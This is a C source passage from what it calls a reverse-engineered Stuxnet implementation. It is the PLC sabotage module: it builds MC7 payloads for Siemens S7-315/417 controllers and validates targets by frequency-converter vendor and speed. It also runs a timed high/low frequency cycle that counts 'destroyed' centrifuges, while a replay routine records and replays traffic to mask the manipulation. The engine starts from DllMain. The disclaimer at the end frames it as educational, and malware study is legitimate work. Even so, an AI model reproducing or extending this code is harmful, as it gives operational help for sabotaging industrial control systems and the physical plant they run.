    EmitMC7_Store(&pMC7, &idx, 0x1108);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Load(&pMC7, &idx, 0x1108);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Marker(&pMC7, &idx, MC7_MARKER_DEADF007);
    EmitMC7_Load(&pMC7, &idx, 0x1106);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1104);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_Return(&pMC7, &idx);
    EmitMC7_Load(&pMC7, &idx, 0x110A);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x110A);
    EmitMC7_Return(&pMC7, &idx);
    pMC7[idx] = 0x0000;
    pMC7[dwPatch1] = (WORD)((idx - dwPatch1) & 0xFFFF);
    pMC7[dwPatch2] = (WORD)((0x0032 - dwPatch2) & 0xFFFF);
    pMC7[dwPatch3] = (WORD)((0x0040 - dwPatch3) & 0xFFFF);
    pMC7[dwPatch4] = (WORD)((0x0048 - dwPatch4) & 0xFFFF);
    pPLC->dwMC7Size = idx * 2;
    return TRUE;
}

static BOOL BuildMC7Payload_S7_417(PS7_PLC_TARGET pPLC) {
    PWORD pMC7;
    DWORD idx;
    DWORD dwPatch1, dwPatch2, dwPatch3;
    DWORD dwFreqHigh;
    DWORD dwFreqLow;
    DWORD dwFreqNormal;
    DWORD dwHighDuration;
    DWORD dwLowDuration;
    DWORD dwCascadeCount;
    if (!pPLC) return FALSE;
    pMC7 = (PWORD)pPLC->bMC7Payload;
    idx = 0;
    dwFreqHigh = FREQ_ATTACK_HIGH;
    dwFreqLow = FREQ_ATTACK_LOW;
    dwFreqNormal = FREQ_NORMAL;
    dwHighDuration = ATTACK_HIGH_DURATION_MS / 100;
    dwLowDuration = ATTACK_LOW_DURATION_MS / 100;
    dwCascadeCount = pPLC->dwCascadeCount;
    pMC7[idx++] = 0x0700;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x00FB;
    pMC7[idx++] = 0x0000;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x0002;
    pMC7[idx++] = 0x0000;
    EmitMC7_Load(&pMC7, &idx, 0x1164);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch1 = idx - 2;
    EmitMC7_Jump(&pMC7, &idx, 0, FALSE);
    dwPatch2 = idx - 2;
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1102);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1164);
    EmitMC7_Load(&pMC7, &idx, 0x1180);
    EmitMC7_LoadConst(&pMC7, &idx, dwCascadeCount);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1180);
    EmitMC7_LoadConst(&pMC7, &idx, 33);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch3 = idx - 2;
    EmitMC7_Return(&pMC7, &idx);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Return(&pMC7, &idx);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqHigh);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwHighDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqLow);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwLowDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);
    EmitMC7_Load(&pMC7, &idx, 0x1104);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x1108);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Load(&pMC7, &idx, 0x1108);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Marker(&pMC7, &idx, MC7_MARKER_DEADF007);
    EmitMC7_Load(&pMC7, &idx, 0x1106);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1104);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_Load(&pMC7, &idx, 0x1180);
    EmitMC7_LoadConst(&pMC7, &idx, 33);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Return(&pMC7, &idx);
    pMC7[idx] = 0x0000;
    pMC7[dwPatch1] = (WORD)((idx - dwPatch1) & 0xFFFF);
    pMC7[dwPatch2] = (WORD)((0x0032 - dwPatch2) & 0xFFFF);
    pMC7[dwPatch3] = (WORD)((0x0045 - dwPatch3) & 0xFFFF);
    pPLC->dwMC7Size = idx * 2;
    return TRUE;
}

static BOOL ValidateTarget_IR1(PS7_PLC_TARGET pPLC) {
    DWORD dwVaconCount;
    DWORD dwFararoCount;
    DWORD i;
    DWORD dwFreqMin;
    DWORD dwFreqMax;
    if (!pPLC) return FALSE;
    if (pPLC->dwCPUType != S7_315_CPU && pPLC->dwCPUType != S7_417_CPU) {
        return FALSE;
    }
    if (pPLC->dwCPUType == S7_315_CPU) {
        pPLC->bS7_315 = TRUE;
        pPLC->bS7_417 = FALSE;
    } else {
        pPLC->bS7_315 = FALSE;
        pPLC->bS7_417 = TRUE;
    }
    if (pPLC->dwConverterCount < TARGET_CONVERTER_MIN) {
        return FALSE;
    }
    if (pPLC->dwConverterCount > TARGET_CONVERTER_MAX) {
        return FALSE;
    }
    dwVaconCount = 0;
    dwFararoCount = 0;
    for (i = 0; i < pPLC->dwConverterCount; i++) {
        if (pPLC->dwConverterTypes[i] == 0x7050) {
            dwVaconCount++;
        }
        if (pPLC->dwConverterTypes[i] == 0x9500) {
            dwFararoCount++;
        }
    }
    if (dwVaconCount + dwFararoCount < TARGET_CONVERTER_MIN) {
        return FALSE;
    }
    dwFreqMin = 0xFFFFFFFF;
    dwFreqMax = 0;
    for (i = 0; i < pPLC->dwConverterCount; i++) {
        if (pPLC->wCurrentFreq[i] < dwFreqMin) {
            dwFreqMin = pPLC->wCurrentFreq[i];
        }
        if (pPLC->wCurrentFreq[i] > dwFreqMax) {
            dwFreqMax = pPLC->wCurrentFreq[i];
        }
        if (pPLC->wCurrentFreq[i] < FREQ_MIN_TARGET || pPLC->wCurrentFreq[i] > FREQ_MAX_TARGET) {
            return FALSE;
        }
    }
    if (dwFreqMin < FREQ_MIN_TARGET || dwFreqMax > FREQ_MAX_TARGET) {
        return FALSE;
    }
    if (dwFreqMax - dwFreqMin > 100) {
        return FALSE;
    }
    for (i = 0; i < pPLC->dwConverterCount; i++) {
        pPLC->wOriginalFreq[i] = pPLC->wCurrentFreq[i];
    }
    pPLC->bTargetValidated = TRUE;
    pPLC->state.dwTargetConverters = pPLC->dwConverterCount;
    return TRUE;
}

static BOOL MITM_StartRecording(PMITM_CTX pCtx) {
    if (!pCtx) return FALSE;
    EnterCriticalSection(&pCtx->csLock);
    pCtx->bRecording = TRUE;
    pCtx->dwRecordSize = 0;
    ZeroMemory(pCtx->bRecordBuffer, sizeof(pCtx->bRecordBuffer));
    LeaveCriticalSection(&pCtx->csLock);
    return TRUE;
}

static BOOL MITM_StopRecording(PMITM_CTX pCtx) {
    if (!pCtx) return FALSE;
    EnterCriticalSection(&pCtx->csLock);
    pCtx->bRecording = FALSE;
    LeaveCriticalSection(&pCtx->csLock);
    return TRUE;
}

static BOOL MITM_RecordData(PMITM_CTX pCtx, PBYTE pData, DWORD dwSize) {
    if (!pCtx || !pData || dwSize == 0) return FALSE;
    EnterCriticalSection(&pCtx->csLock);
    if (pCtx->bRecording && pCtx->dwRecordSize + dwSize < sizeof(pCtx->bRecordBuffer)) {
        memcpy(pCtx->bRecordBuffer + pCtx->dwRecordSize, pData, dwSize);
        pCtx->dwRecordSize += dwSize;
    }
    LeaveCriticalSection(&pCtx->csLock);
    return TRUE;
}

static BOOL MITM_StartReplay(PMITM_CTX pCtx) {
    if (!pCtx) return FALSE;
    EnterCriticalSection(&pCtx->csLock);
    if (pCtx->dwRecordSize > 0) {
        memcpy(pCtx->bReplayBuffer, pCtx->bRecordBuffer, pCtx->dwRecordSize);
        pCtx->dwReplayIndex = 0;
        pCtx->bReplaying = TRUE;
        pCtx->bActive = TRUE;
        LeaveCriticalSection(&pCtx->csLock);
        return TRUE;
    }
    LeaveCriticalSection(&pCtx->csLock);
    return FALSE;
}

static BOOL MITM_StopReplay(PMITM_CTX pCtx) {
    if (!pCtx) return FALSE;
    EnterCriticalSection(&pCtx->csLock);
    pCtx->bReplaying = FALSE;
    pCtx->bActive = FALSE;
    LeaveCriticalSection(&pCtx->csLock);
    return TRUE;
}

static BOOL MITM_ReplayData(PMITM_CTX pCtx, PBYTE pOutput, PDWORD pdwSize) {
    DWORD dwRemaining;
    if (!pCtx || !pOutput || !pdwSize) return FALSE;
    EnterCriticalSection(&pCtx->csLock);
    if (!pCtx->bReplaying || pCtx->dwReplayIndex >= pCtx->dwRecordSize) {
        LeaveCriticalSection(&pCtx->csLock);
        return FALSE;
    }
    dwRemaining = pCtx->dwRecordSize - pCtx->dwReplayIndex;
    if (dwRemaining < *pdwSize) {
        *pdwSize = dwRemaining;
    }
    memcpy(pOutput, pCtx->bReplayBuffer + pCtx->dwReplayIndex, *pdwSize);
    pCtx->dwReplayIndex += *pdwSize;
    if (pCtx->dwReplayIndex >= pCtx->dwRecordSize) {
        pCtx->bReplaying = FALSE;
    }
    LeaveCriticalSection(&pCtx->csLock);
    return TRUE;
}

static BOOL InjectProfibusTraffic(PS7_PLC_TARGET pPLC) {
    BYTE dpPacket[256];
    DWORD dwOffset;
    DWORD i;
    if (!pPLC || !pPLC->bTargetValidated) return FALSE;
    ZeroMemory(dpPacket, sizeof(dpPacket));
    *(DWORD*)(dpPacket + 0) = STUXNET_PROFIBUS_DP_OFFSET;
    *(DWORD*)(dpPacket + 4) = pPLC->dwCPUType;
    *(DWORD*)(dpPacket + 8) = pPLC->dwConverterCount;
    *(DWORD*)(dpPacket + 12) = 0xDEADBEEF;
    dwOffset = 16;
    for (i = 0; i < pPLC->dwConverterCount && i < 64; i++) {
        *(WORD*)(dpPacket + dwOffset) = pPLC->wCurrentFreq[i];
        dwOffset += 2;
        *(WORD*)(dpPacket + dwOffset) = pPLC->wOriginalFreq[i];
        dwOffset += 2;
    }
    return TRUE;
}

static DWORD WINAPI AttackMainThread(LPVOID lpParam) {
    PS7_PLC_TARGET pPLC;
    DWORD dwCurrentTime;
    DWORD dwElapsed;
    DWORD dwWaitResult;
    pPLC = (PS7_PLC_TARGET)lpParam;
    if (!pPLC || !pPLC->bTargetValidated) {
        return 1;
    }
    EnterCriticalSection(&g_csAttack);
    pPLC->state.dwPhase = PHASE_SURVEILLANCE;
    pPLC->state.dwPhaseStartTime = GetTickCount();
    pPLC->state.bAttackActive = TRUE;
    pPLC->bAttackRunning = TRUE;
    LeaveCriticalSection(&g_csAttack);
    while (pPLC->state.bAttackActive) {
        dwWaitResult = WaitForSingleObject(g_hStopEvent, 1000);
        if (dwWaitResult == WAIT_OBJECT_0) {
            break;
        }
        dwCurrentTime = GetTickCount();
        dwElapsed = dwCurrentTime - pPLC->state.dwPhaseStartTime;
        EnterCriticalSection(&g_csAttack);
        switch (pPLC->state.dwPhase) {
            case PHASE_SURVEILLANCE:
                if (dwElapsed > ATTACK_INITIAL_DELAY_DAYS * 24 * 3600 * 1000) {
                    pPLC->state.dwPhase = PHASE_HIGH_FREQ;
                    pPLC->state.dwPhaseStartTime = dwCurrentTime;
                    pPLC->state.dwHighFreqCount++;
                    MITM_StartRecording(&g_MITMCtx);
                }
                break;
            case PHASE_HIGH_FREQ:
                if (dwElapsed > ATTACK_HIGH_DURATION_MS) {
                    pPLC->state.dwPhase = PHASE_COOLDOWN;
                    pPLC->state.dwPhaseStartTime = dwCurrentTime;
                    MITM_StopRecording(&g_MITMCtx);
                    MITM_StartReplay(&g_MITMCtx);
                }
                break;
            case PHASE_COOLDOWN:
                if (dwElapsed > ATTACK_CYCLE_MS) {
                    pPLC->state.dwPhase = PHASE_LOW_FREQ;
                    pPLC->state.dwPhaseStartTime = dwCurrentTime;
                    pPLC->state.dwLowFreqCount++;
                }
                break;
            case PHASE_LOW_FREQ:
                if (dwElapsed > ATTACK_LOW_DURATION_MS) {
                    pPLC->state.dwPhase = PHASE_RECOVERY;
                    pPLC->state.dwPhaseStartTime = dwCurrentTime;
                    MITM_StopReplay(&g_MITMCtx);
                    pPLC->state.dwCycleCount++;
                    g_dwCentrifugeDestroyed++;
                }
                break;
            case PHASE_RECOVERY:
                if (dwElapsed > ATTACK_CYCLE_MS) {
                    pPLC->state.dwPhase = PHASE_HIGH_FREQ;
                    pPLC->state.dwPhaseStartTime = dwCurrentTime;
                    pPLC->state.dwHighFreqCount++;
                    MITM_StartRecording(&g_MITMCtx);
                }
                break;
            case PHASE_COMPLETE:
                pPLC->state.bAttackActive = FALSE;
                break;
            default:
                break;
        }
        if (pPLC->state.dwCycleCount > 100) {
            pPLC->state.dwPhase = PHASE_COMPLETE;
            pPLC->state.bAttackActive = FALSE;
        }
        pPLC->state.dwCurrentFreq = FREQ_NORMAL;
        if (pPLC->state.dwPhase == PHASE_HIGH_FREQ) {
            pPLC->state.dwCurrentFreq = FREQ_ATTACK_HIGH;
        } else if (pPLC->state.dwPhase == PHASE_LOW_FREQ) {
            pPLC->state.dwCurrentFreq = FREQ_ATTACK_LOW;
        } else if (pPLC->state.dwPhase == PHASE_SURVEILLANCE) {
            pPLC->state.dwCurrentFreq = FREQ_NORMAL;
        }
        LeaveCriticalSection(&g_csAttack);
    }
    EnterCriticalSection(&g_csAttack);
    pPLC->bAttackRunning = FALSE;
    LeaveCriticalSection(&g_csAttack);
    return 0;
}

static BOOL StartAttack(PS7_PLC_TARGET pPLC) {
    HANDLE hThread;
    if (!pPLC || !pPLC->bTargetValidated) {
        return FALSE;
    }
    if (pPLC->bAttackRunning) {
        return FALSE;
    }
    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_hStopEvent) {
        return FALSE;
    }
    hThread = CreateThread(NULL, 0, AttackMainThread, pPLC, 0, NULL);
    if (!hThread) {
        CloseHandle(g_hStopEvent);
        g_hStopEvent = NULL;
        return FALSE;
    }
    g_hAttackThread = hThread;
    g_dwAttackCount++;
    return TRUE;
}

static VOID StopAttack(VOID) {
    if (g_hStopEvent) {
        SetEvent(g_hStopEvent);
    }
    if (g_hAttackThread) {
        WaitForSingleObject(g_hAttackThread, 5000);
        CloseHandle(g_hAttackThread);
        g_hAttackThread = NULL;
    }
    if (g_hStopEvent) {
        CloseHandle(g_hStopEvent);
        g_hStopEvent = NULL;
    }
}

static BOOL InitAttackEngine(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_TargetPLC, sizeof(S7_PLC_TARGET));
    ZeroMemory(&g_AttackState, sizeof(ATTACK_STATE));
    ZeroMemory(&g_MITMCtx, sizeof(MITM_CTX));
    InitializeCriticalSection(&g_MITMCtx.csLock);
    InitializeCriticalSection(&g_csAttack);
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID CleanupAttackEngine(VOID) {
    if (!g_bInitialized) return;
    StopAttack();
    DeleteCriticalSection(&g_MITMCtx.csLock);
    DeleteCriticalSection(&g_csAttack);
    g_bInitialized = FALSE;
}

DWORD WINAPI Attack_Init(VOID) {
    return InitAttackEngine() ? 0 : 1;
}

DWORD WINAPI Attack_Cleanup(VOID) {
    CleanupAttackEngine();
    return 0;
}

DWORD WINAPI Attack_ValidateTarget(PS7_PLC_TARGET pPLC) {
    return ValidateTarget_IR1(pPLC) ? 0 : 1;
}

DWORD WINAPI Attack_Start(PS7_PLC_TARGET pPLC) {
    return StartAttack(pPLC) ? 0 : 1;
}

DWORD WINAPI Attack_Stop(VOID) {
    StopAttack();
    return 0;
}

DWORD WINAPI Attack_GetState(VOID) {
    DWORD dwState;
    EnterCriticalSection(&g_csAttack);
    dwState = g_AttackState.dwPhase;
    LeaveCriticalSection(&g_csAttack);
    return dwState;
}

DWORD WINAPI Attack_GetCycleCount(VOID) {
    DWORD dwCount;
    EnterCriticalSection(&g_csAttack);
    dwCount = g_AttackState.dwCycleCount;
    LeaveCriticalSection(&g_csAttack);
    return dwCount;
}

DWORD WINAPI Attack_GetDestroyedCount(VOID) {
    return g_dwCentrifugeDestroyed;
}

DWORD WINAPI Attack_BuildPayload_S7_315(PS7_PLC_TARGET pPLC) {
    return BuildMC7Payload_S7_315(pPLC) ? 0 : 1;
}

DWORD WINAPI Attack_BuildPayload_S7_417(PS7_PLC_TARGET pPLC) {
    return BuildMC7Payload_S7_417(pPLC) ? 0 : 1;
}

DWORD WINAPI Attack_MITM_StartRecord(VOID) {
    return MITM_StartRecording(&g_MITMCtx) ? 0 : 1;
}

DWORD WINAPI Attack_MITM_StopRecord(VOID) {
    return MITM_StopRecording(&g_MITMCtx) ? 0 : 1;
}

DWORD WINAPI Attack_MITM_StartReplay(VOID) {
    return MITM_StartReplay(&g_MITMCtx) ? 0 : 1;
}

DWORD WINAPI Attack_MITM_StopReplay(VOID) {
    return MITM_StopReplay(&g_MITMCtx) ? 0 : 1;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            InitAttackEngine();
            break;
        case DLL_PROCESS_DETACH:
            CleanupAttackEngine();
            break;
        default:
            break;
    }
    return TRUE;
}

#A reverse-engineered implementation of Stuxnet based on all available vendor reports, publicly disclosed code, and security research, for educational and research purposes only. Made by OvO.

            Thank you research-virus/stuxnet Rootkit and Dropper. More and other.
            
License: See README.
All Copyright Reserved.
